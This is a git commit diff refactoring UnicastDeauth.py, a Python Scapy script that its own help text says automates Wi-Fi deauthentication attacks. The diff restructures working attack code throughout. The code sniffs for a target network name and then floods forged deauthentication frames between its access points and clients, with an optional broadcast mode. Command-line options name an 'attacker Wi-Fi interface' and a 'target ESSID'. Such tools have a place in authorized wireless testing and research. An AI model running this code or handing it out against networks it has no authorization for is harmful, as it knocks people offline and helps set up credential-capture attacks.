68237754a782886ec975fa500bfb2f6156c5e196
mamatb <42239435+mamatb@users.noreply.github.com>
2024-01-18 13:19:13 +0100

    OOP refactor, style guide recommendations implemented

--- UnicastDeauth.py
+++ UnicastDeauth.py
@@ -21,13 +21,17 @@ BROADCAST = 'ff:ff:ff:ff:ff:ff'
 DEAUTH_COUNT = 64
 
 class MsgException(Exception):
-    def __init__(self, exception: Exception, message: str = 'Unknown error', *args, **kwargs) -> None:
+    def __init__(self, exception: Exception, message: str = 'Unknown error',
+                 *args, **kwargs) -> None:
         super().__init__(*args, **kwargs)
         self._exception = exception
         self._message = message
     
     def __str__(self) -> str:
-        return f'[!] Error! {self._message}:\n    {self._exception}'
+        return (
+            f'[!] Error! {self._message}:'
+            f'\n    {self._exception}'
+        )
 
 class AccessPoints:
     
@@ -47,6 +51,9 @@ class AccessPoints:
     
     def get_essid(self) -> str:
       return self._essid
+    
+    def get_bssids(self) -> set[str]:
+        return self._bssids
     
     def add(self, bssid: str) -> None:
         self._bssids.add(bssid)
@@ -70,6 +77,22 @@ class Stations:
             f'\n    station      = {bssid_sta}'
             f'\n    access point = {bssid_ap}'
         )
+
+class DeauthConfig:
+    def __init__(self, wifi_interface: str, broadcast_enabled: bool,
+                 deauth_rounds: int) -> None:
+        self._wifi_interface = wifi_interface
+        self._broadcast_enabled = broadcast_enabled
+        self._deauth_rounds = deauth_rounds
+    
+    def get_interface(self) -> str:
+        return self._wifi_interface
+    
+    def get_broadcast(self) -> bool:
+        return self._broadcast_enabled
+    
+    def get_rounds(self) -> int:
+        return self._deauth_rounds
 
 def panic(msg_exception: MsgException) -> None:
     '''exception handling'''
@@ -113,99 +136,160 @@ def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
-def unicast_deauth(wifi_interface: str, deauth_rounds: int, bssid_sta: str, bssid_ap: str, bssid_network: str) -> None:
+def unicast_deauth(config: DeauthConfig, bssid_sta: str, bssid_ap: str,
+                   bssid_network: str) -> None:
     '''unicast deauthentication'''
     
     try:
         def unicast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(deauth_rounds):
+            for i in range(config.get_rounds()):
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                        dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+                        dot11.Dot11(
+                            addr1 = bssid_sta,
+                            addr2 = bssid_ap,
+                            addr3 = bssid_network,
+                        ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = wifi_interface,
+                    iface = config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                        dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+                        dot11.Dot11(
+                            addr1 = bssid_ap,
+                            addr2 = bssid_sta,
+                            addr3 = bssid_network,
+                        ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = wifi_interface,
+                    iface = config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = unicast_deauth_parallel).start()
-        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
-        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
+        print_info(
+            f'sending {config.get_rounds()} x {DEAUTH_COUNT} deauthentication'
+            f' frames from AP {bssid_ap} to STA {bssid_sta} ...'
+        )
+        print_info(
+            f'sending {config.get_rounds()} x {DEAUTH_COUNT} deauthentication'
+            f' frames from STA {bssid_sta} to AP {bssid_ap} ...'
+        )
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def broadcast_deauth(wifi_interface: str, deauth_rounds: int, bssid_ap: str, bssid_network: str) -> None:
+def broadcast_deauth(config: DeauthConfig, bssid_ap: str, bssid_network: str) -> None:
     '''broadcast deauthentication'''
     
     try:
         def broadcast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(deauth_rounds):
+            for i in range(config.get_rounds()):
                 sendrecv.sendp(
                     dot11.RadioTap() /
-                        dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+                        dot11.Dot11(
+                            addr1 = BROADCAST,
+                            addr2 = bssid_ap,
+                            addr3 = bssid_network,
+                        ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = wifi_interface,
+                    iface = config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = broadcast_deauth_parallel).start()
-        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
+        print_info(
+            f'sending {config.get_rounds()} x {DEAUTH_COUNT} broadcast'
+            f' deauthentication frames from AP {bssid_ap} ...'
+        )
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface: str, broadcast_enabled: bool, deauth_rounds: int, aps_targetlist: AccessPoints,
+def handle_beacon_proberesp(frame: dot11.Dot11, config: DeauthConfig,
+                            aps_targetlist: AccessPoints,
+                            aps_whitelist: AccessPoints) -> None:
+    '''beacon and probe-resp frames processing'''
+    
+    try:
+        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
+        if (
+            bssid_src and bssid_dst and bssid_network and
+            bssid_src not in aps_targetlist and
+            bssid_src not in aps_whitelist
+        ):
+            dot11_element = frame.getlayer(dot11.Dot11Elt)
+            while dot11_element:
+                if dot11_element.ID == 0:
+                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
+                        aps_targetlist.add(bssid_src)
+                        if config.get_broadcast():
+                            broadcast_deauth(config, bssid_src, bssid_network)
+                    break
+                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
+    except Exception as e:
+        raise MsgException(e, 'beacon and/or probe-resp frames could not be processed')
+
+def handle_probereq(frame: dot11.Dot11, config: DeauthConfig,
+                    aps_targetlist: AccessPoints, aps_whitelist :AccessPoints) -> None:
+    '''probe-req frames processing'''
+    
+    try:
+        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
+        if (
+            bssid_src and bssid_dst and bssid_network and
+            is_unicast(bssid_dst) and
+            bssid_dst not in aps_targetlist and
+            bssid_dst not in aps_whitelist
+        ):
+            dot11_element = frame.getlayer(dot11.Dot11Elt)
+            while dot11_element:
+                if dot11_element.ID == 0:
+                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
+                        aps_targetlist.add(bssid_dst)
+                        if config.get_broadcast():
+                            broadcast_deauth(config, bssid_dst, bssid_network)
+                    break
+                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
+    except Exception as e:
+        raise MsgException(e, 'probe-req frames could not be processed')
+
+def handle_ctl_data(frame: dot11.Dot11, config: DeauthConfig,
+                    aps_targetlist: AccessPoints, stations: Stations) -> None:
+    '''ctl and data frames processing'''
+    
+    try:
+        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
+        if bssid_src and bssid_dst and bssid_network:
+            if (
+                is_unicast(bssid_dst) and
+                bssid_src in aps_targetlist and
+                stations.get(bssid_dst) != bssid_src
+            ):
+                stations.update(bssid_dst, bssid_src)
+                unicast_deauth(config, bssid_dst, bssid_src, bssid_network)
+            elif (
+                bssid_dst in aps_targetlist and
+                stations.get(bssid_src) != bssid_dst
+            ):
+                stations.update(bssid_src, bssid_dst)
+                unicast_deauth(config, bssid_src, bssid_dst, bssid_network)
+    except Exception as e:
+        raise MsgException(e, 'ctl and/or data frames could not be processed')
+
+def sniffer_wrapper(config: DeauthConfig, aps_targetlist: AccessPoints,
                     aps_whitelist: AccessPoints, stations: Stations) -> None:
     def sniffer_handler(frame: dot11.Dot11) -> None:
-        '''sniffed frame processing'''
+        '''sniffed frames processing'''
         
         try:
-            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
-            if bssid_src and bssid_dst and bssid_network:
-                
-                # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
-                if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
-                    if (bssid_src not in aps_whitelist) and (bssid_src not in aps_targetlist):
-                        dot11_element = frame.getlayer(dot11.Dot11Elt)
-                        while dot11_element:
-                            if dot11_element.ID == 0:
-                                if dot11_element.info and (dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8')):
-                                    aps_targetlist.add(bssid_src)
-                                    if broadcast_enabled:
-                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_network)
-                                break
-                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
-                
-                # wlan type mgt subtype probe-req
-                elif frame.haslayer(dot11.Dot11ProbeReq):
-                    if (bssid_dst not in aps_whitelist) and (bssid_dst not in aps_targetlist) and is_unicast(bssid_dst):
-                        dot11_element = frame.getlayer(dot11.Dot11Elt)
-                        while dot11_element:
-                            if dot11_element.ID == 0:
-                                if dot11_element.info and (dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8')):
-                                    aps_targetlist.add(bssid_dst)
-                                    if broadcast_enabled:
-                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_network)
-                                break
-                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
-                
-                # wlan type ctl or wlan type data: from ap to sta, from sta to ap
-                else:
-                    if (bssid_src in aps_targetlist) and (stations.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
-                        stations.update(bssid_dst, bssid_src)
-                        unicast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_src, bssid_network)
-                    elif (bssid_dst in aps_targetlist) and (stations.get(bssid_src) != bssid_dst):
-                        stations.update(bssid_src, bssid_dst)
-                        unicast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_dst, bssid_network)
-        
+            if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
+                handle_beacon_proberesp(frame, config, aps_targetlist, aps_whitelist)
+            elif frame.haslayer(dot11.Dot11ProbeReq):
+                handle_probereq(frame, config, aps_targetlist, aps_whitelist)
+            else:
+                handle_ctl_data(frame, config, aps_targetlist, stations)
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
@@ -222,16 +306,48 @@ def main() -> None:
             'UnicastDeauth.py -i wlan0 -e NETGEAR -wl 00:11:22:33:44:00,00:11:22:33:44:55',
         ]
         parser = argparse.ArgumentParser(
-            description = 'UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks',
+            description = (
+                'UnicastDeauth is a simple Python 3 script that automates'
+                ' unicast Wi-Fi deauthentication attacks'
+            ),
             formatter_class = argparse.RawTextHelpFormatter,
             epilog = '\n  '.join(examples),
         )
-        parser.add_argument('-i', dest = 'wifi_interface', help = 'attacker Wi-Fi interface', required = True)
-        parser.add_argument('-e', dest = 'essid', help = 'target ESSID', required = True)
-        parser.add_argument('-b', dest = 'broadcast_enabled', help = 'enable broadcast deauthentication', action = 'store_true')
-        parser.add_argument('-n', dest = 'deauth_rounds', help = 'number of deauthentication rounds', type = int, default = 1)
-        parser.add_argument('-tl', dest = 'aps_targetlist', help = 'comma-separated known target APs')
-        parser.add_argument('-wl', dest = 'aps_whitelist', help = 'comma-separated APs whitelist')
+        parser.add_argument(
+            '-i',
+            dest = 'wifi_interface',
+            required = True,
+            help = 'attacker Wi-Fi interface',
+        )
+        parser.add_argument(
+            '-e',
+            dest = 'essid',
+            required = True,
+            help = 'target ESSID',
+        )
+        parser.add_argument(
+            '-b',
+            dest = 'broadcast_enabled',
+            action = 'store_true',
+            help = 'enable broadcast deauthentication',
+        )
+        parser.add_argument(
+            '-n',
+            dest = 'deauth_rounds',
+            type = int,
+            default = 1,
+            help = 'number of deauthentication rounds',
+        )
+        parser.add_argument(
+            '-tl',
+            dest = 'aps_targetlist',
+            help = 'comma-separated known target APs',
+        )
+        parser.add_argument(
+            '-wl',
+            dest = 'aps_whitelist',
+            help = 'comma-separated APs whitelist',
+        )
         args = parser.parse_args()
         filters = [
             'wlan type mgt subtype beacon',
@@ -240,13 +356,21 @@ def main() -> None:
             'wlan type ctl',
             'wlan type data',
         ]
+        config = DeauthConfig(
+            args.wifi_interface,
+            args.broadcast_enabled,
+            args.deauth_rounds,
+        )
         aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
         aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
         stations = Stations(args.essid)
+        if config.get_broadcast():
+            for bssid in aps_targetlist.get_bssids():
+                broadcast_deauth(config, bssid, bssid)
         sendrecv.sniff(
             iface = args.wifi_interface,
             filter = ' or '.join(filters),
-            prn = sniffer_wrapper(args.wifi_interface, args.broadcast_enabled, args.deauth_rounds, aps_targetlist, aps_whitelist, stations),
+            prn = sniffer_wrapper(config, aps_targetlist, aps_whitelist, stations),
         )
     except MsgException as msg_exception:
         panic(msg_exception)
